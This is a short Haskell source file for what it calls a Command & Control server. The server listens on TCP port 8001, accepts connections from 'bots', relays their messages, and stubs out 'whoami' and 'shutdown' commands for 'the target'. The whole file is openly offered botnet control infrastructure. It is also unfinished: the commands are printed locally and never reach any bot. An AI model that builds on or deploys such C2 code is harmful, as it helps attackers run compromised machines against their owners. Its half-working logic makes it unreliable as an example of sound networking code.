{--
 - Creator: VPR
 - Created: November 28, 2021
 - Updated: November 29, 2021
 -
 - Description:
 -     A Command & Control interface that establishes a client/server model
 -     that uses TCP sockets.
--}

module Main where

import System.IO
import Network.Socket
import Control.Exception
import Control.Concurrent
import Control.Monad (when)
import Control.Monad.Fix (fix)

main :: IO ()
main = do
    sock <- socket AF_INET Stream 0
    setSocketOption sock ReuseAddr 1
    bind sock (SockAddrInet 8001 0)
    listen sock 2

    -- Initial Message (un-hardcode this)
    putStrLn ("[!] Listening on localhost:8001")

    chan <- newChan
    _ <- forkIO $ fix $ \loop -> do
      (_, _) <- readChan chan
      loop
    mainLoop sock chan 0

type Msg = (Int, String)

mainLoop :: Socket -> Chan Msg -> Int -> IO ()
mainLoop sock chan msgNum = do
    conn <- accept sock
    forkIO (runConn conn chan msgNum)
    mainLoop sock chan $! msgNum + 1

runConn :: (Socket, SockAddr) -> Chan Msg -> Int -> IO ()
runConn (sock, _) chan msgNum = do
    let broadcast msg = writeChan chan (msgNum, msg)
    hdl <- socketToHandle sock ReadWriteMode
    hSetBuffering hdl NoBuffering

    -- Debug
    putStrLn ("[+] Bot connected.")
    putStr (":> ")
    recvBuffer <- fmap init (hGetLine hdl)
    putStrLn ("Data: " ++ recvBuffer ++ " recieved.")
    putStr (":> ")

    commLine <- dupChan chan

    -- fork off a thread for reading from the duplicated channel
    reader <- forkIO $ fix $ \loop -> do
        (nextNum, line) <- readChan commLine
        when (msgNum /= nextNum) $ hPutStrLn hdl line
        loop

    handle (\(SomeException _) -> return ()) $ fix $ \loop -> do
        line <- fmap init (hGetLine hdl)
        case line of
             -- Issue a command to get the username of the target
             "whoami" -> putStrLn "whoami" >> loop
             -- Issue a command to terminate the bot
             "shutdown" -> putStrLn "shutdown"
             -- else, continue looping.
             _      -> broadcast (recvBuffer ++ ": " ++ line) >> loop

    killThread reader                      -- kill after the loop ends
    broadcast ("[-] " ++ recvBuffer ++ " executed?") -- make a final broadcast
    hClose hdl                             -- close the handle
